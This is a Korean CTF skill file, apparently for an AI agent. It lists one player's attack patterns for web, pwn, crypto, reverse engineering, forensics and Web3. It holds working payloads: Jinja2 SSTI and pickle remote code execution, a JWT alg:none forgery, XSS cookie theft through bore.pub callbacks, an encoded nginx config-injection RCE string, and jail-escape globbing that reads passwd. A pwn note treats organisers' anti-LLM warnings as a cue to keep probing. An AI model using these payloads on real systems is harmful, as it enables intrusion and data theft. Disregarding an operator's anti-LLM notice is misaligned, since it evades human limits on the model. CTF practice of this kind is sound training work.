---
name: ctf-personal
description: >
  명종의 CTF 풀이 경험 기반 코드 템플릿과 공격 패턴 모음.
  카테고리별 ctf-* 스킬과 함께 로드되며, 범용 스킬에 없는
  개인 경험 패턴(bore.pub 콜백, ETag leak, nginx RCE 등)과
  자주 쓰는 코드 스니펫을 제공한다.
---

# 개인 CTF 코어 패턴

## 추가 리소스
- [war-stories.md](war-stories.md) - 특정 문제에서만 적용되는 특수 사례 기록. 유사 패턴 인식 시 참조.
- [platform-notes.md](platform-notes.md) - 플랫폼/환경별 특이사항 및 주의점.

---

## Web 패턴

### XSS + Bot 챌린지
1. XSS 페이로드 → 봇 방문 유도
2. document.cookie 또는 내부 fetch → bore.pub 콜백
3. CMS(WordPress 등) → 플러그인 업로드 CSRF 체이닝

**cloudflared 콜백 서버 사용 시 주의:**
```python
# 터널 URL 획득 후 바로 exploit 제출하면 0 hits (라우팅 미안정)
# 반드시 ~8초 대기
time.sleep(8)
```

### Unquoted Attribute XSS — 공백 금지 규칙

`onerror=PAYLOAD//>`처럼 unquoted attribute에 payload 넣을 때, **공백(space/tab/LF)이 속성값을 종료**시킨다.
`"`, `'`, `=`, `<`, `` ` ``는 parse error이지만 값에 추가됨. `>`는 태그 종료.

```html
<!-- 실패: return 뒤 공백에서 onerror 값이 잘림 -->
<img onerror=fetch('/buy').then(function(r){return r.json();})>

<!-- 성공: /**/ 로 공백 대체 (HTML 파서는 문자로 추가, JS는 whitespace로 처리) -->
<img onerror=fetch('/buy').then(function(r){return/**/r.json();})>
```

payload 작성 체크리스트:
- 공백 없음 (JS 전체 스캔)
- `>` 없음 (태그 조기 종료)
- `"` 없음 (quote context 파괴)
- 불가피한 공백 → `/**/` 대체

### SSRF + DNS Rebinding
1. 내부망 타겟 확인 (127.x, 10.x, 169.254.x.x)
2. rbndr.us DNS rebinding 설정
3. bore.pub 콜백 수신 (VPS 불필요)
4. 리다이렉트 루프 우회 (HTTPS-only, 빈 응답 주의)

### Validation Before Decoding Mismatch

입력 검사가 **percent-encoded 원문**에 걸리고, 실제 sink에 넣기 직전에 `QueryUnescape` 같은 디코딩이 한 번 더 수행되면 금지 문자를 되살릴 수 있다.

특히 다음 순서면 위험하다:
1. 정규식이 `%`, `#`, `;`, `}` 같은 문자만 허용
2. 검사는 decode 전에 수행
3. 이후 `QueryUnescape` 결과가 nginx/템플릿/DSL 설정값으로 들어감

`edge-gate` 계열 ingress-nginx admission RCE에서 유효했던 형태:
```text
http://example.com/#%3B%7D%7D%7D%0A%0Assl_engine%20../../../../../../mnt/share/payload.so%3B%0A%0A
```

체크리스트:
- raw 입력에 개행/세미콜론이 직접 들어가면 필터에 걸리는지 확인
- `%0A`, `%3B`, `%7D`, `%23`처럼 인코딩했을 때는 통과하는지 비교
- sink가 URL 자체가 아니라 "설정 문자열"로 재사용되는지 확인
- decode 이후 값이 별도 재검증 없이 config/template에 박히면 코드 주입 관점으로 전환

### SSTI
```python
# Jinja2 기본 확인
{{7*7}}  # → 49
# RCE
{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}
# 필터 우회: attr(), |join 등
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}
```

### JWT
- alg:none → 서명 제거 후 페이로드 조작
- RS256→HS256 키 혼동: 공개키로 HS256 서명
- kid injection: `"kid": "../../dev/null"` → 빈 키
```python
import jwt
token = jwt.encode({"role":"admin"}, "", algorithm="none")
```

### 역직렬화
```python
# Python pickle RCE
import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('cat /flag',))
payload = pickle.dumps(Exploit())
```

### GraphQL
- Introspection으로 스키마 덤프
- 클라이언트 사이드 이스케이프 결함 우선 탐색
- 관리자 권한 mutation 탐색

---

## Pwn 패턴

### Decoy 포트 뒤에 공개 course 포트가 살아있는 유형
- 문제 설명에서 몇 개의 decoy endpoint만 강조해도, 연관된 공개 vhost/course site가 살아 있으면 거기에 적힌 원래 포트를 먼저 다시 스캔한다.
- 특히 교육용/랩형 문제는 `/page/...` 문서에 `ssh -p ...`, `:5151`, `:5301-5303` 같은 실제 공략 포트가 그대로 남아 있는 경우가 있다.
- 운영진이 anti-LLM 경고 문구를 의도적으로 넣은 경우, 그 문구 자체를 신호로 보고 서비스 전체를 버리지 말고 같은 도메인의 sibling port/vhost를 넓게 확인한다.

### libc 식별
```python
# leak된 주소로 libc 버전 식별
# libc.rip 또는 libc.blukat.me 에서 검색
# 또는 docker_exec에서: python3 -c "from pwnlib.libcdb import *; print(search_by_symbol_offsets({'puts': 0xXXXXX}))"
```

---

## Crypto 패턴

### RSA
```python
from Crypto.Util.number import *
# 작은 e (e=3): iroot(c, 3)
# n 소인수분해: factordb.com / sympy.factorint
# Wiener's attack: e가 매우 크고 d가 작을 때
# Common modulus: gcd(e1,e2)=1 → 확장 유클리드
# Hastad's broadcast: 같은 m을 여러 n,e로 암호화 → CRT
```

### AES
- ECB mode: 블록 경계 활용, chosen plaintext
- CBC mode: IV 조작, padding oracle
- CTR mode: 키스트림 재사용 → XOR

### 고전 암호
- Caesar: 26가지 brute force
- Vigenere: Index of Coincidence로 키 길이 추정
- XOR: 반복 키 → 키 길이 추정 후 frequency analysis

### 해시
1. hash_crack MCP로 자동 식별 + rockyou 크랙
2. 실패 시 hashcat rule 기반 변형 시도
3. Length extension attack (MD5/SHA1/SHA256)

---

## Reverse 패턴

### 주요 기법
- 안티디버깅: ptrace 체크 NOP 패치
- VM 난독화: 가상 명령어 세트 역분석
- Python 바이트코드: uncompyle6 / pycdc
- .NET: dnSpy로 디컴파일
- Android APK: jadx로 Java 소스 복원
- WASM: wasm2wat으로 텍스트 변환
- Go: 심볼 스트리핑 → GoReSym으로 복원
- Rust: 거대 바이너리, 패닉 문자열에서 함수 이름 힌트

### Z3 플래그 역산
```python
from z3 import *
s = Solver()
flag = [BitVec(f'c{i}', 8) for i in range(length)]
s.add(...)
if s.check() == sat:
    m = s.model()
    print(''.join(chr(m[c].as_long()) for c in flag))
```

---

## Misc 패턴

### Pyjail / Bash Jail
- `__builtins__` 복원: `().__class__.__bases__[0].__subclasses__()`
- 문자 제한 우회: `chr()` 조합, exec/eval 체인
- bash 제한: `/???/??t /???/p?s?w?` 글로빙

### 스테가노그래피
- 이미지: LSB (stegsolve), zsteg, steghide
- JPEG clue형 문제에서 `outguess`가 여러 키에 대해 랜덤 바이너리를 그럴듯하게 뱉어도 속지 말 것. 힌트가 passphrase를 가리키면 `steghide extract -sf image.jpg -p '<key>'`를 먼저 병행해서 실제 ASCII 플래그/텍스트가 바로 나오는지 확인한다.
- 오디오: Audacity 스펙트로그램, SSTV
- 파일: binwalk 추출, foremost

---

## Forensics 패턴

### 네트워크 캡처
- Wireshark: Follow TCP/HTTP stream
- TLS 복호화: 키로그 파일 활용
- USB HID: hidtool / USB-Mouse-Pcap-Visualizer

---

## OSINT 패턴

### Google Dorking
- `site:target.com filetype:pdf`
- `inurl:admin`, `intitle:"index of"`

### 이미지 OSINT
- exiftool → GPS 좌표 → Google Maps
- 역이미지: Google Images, TinEye, Yandex

---

## Web3 패턴

### Solidity 취약점
- reentrancy: checks-effects-interactions 위반
- integer overflow: SafeMath 미사용 (0.8 이전)
- tx.origin 인증: msg.sender로 우회
- selfdestruct: 강제 이더 전송

### 공격 도구
```python
from web3 import Web3
w3 = Web3(Web3.HTTPProvider('http://...'))
contract = w3.eth.contract(address=addr, abi=abi)
tx = contract.functions.attack().build_transaction({...})
```

---

## 자동 학습 규칙
풀이 완료 후 아래 기준에 따라 적절한 파일을 수정한다:

### SKILL.md에 추가하는 경우
- 여러 문제에 범용적으로 적용 가능한 새 기법
- 기존 범용 패턴의 새로운 변형/우회

### war-stories.md에 추가하는 경우
- 특정 문제/플랫폼/CVE에만 해당하는 경험
- 매우 특수한 조건의 풀이 패턴

### platform-notes.md에 추가하는 경우
- MCP 도구 사용 시 발견한 환경별 주의사항
- 특정 CTF 플랫폼(Dreamhack, HackTheBox 등)의 특이 동작

수정 형식:
1. 해당 섹션에 패턴 추가
2. 패턴명, 핵심 원리, 간단한 코드/페이로드 예시 포함
3. 기존 내용은 절대 삭제하지 않음
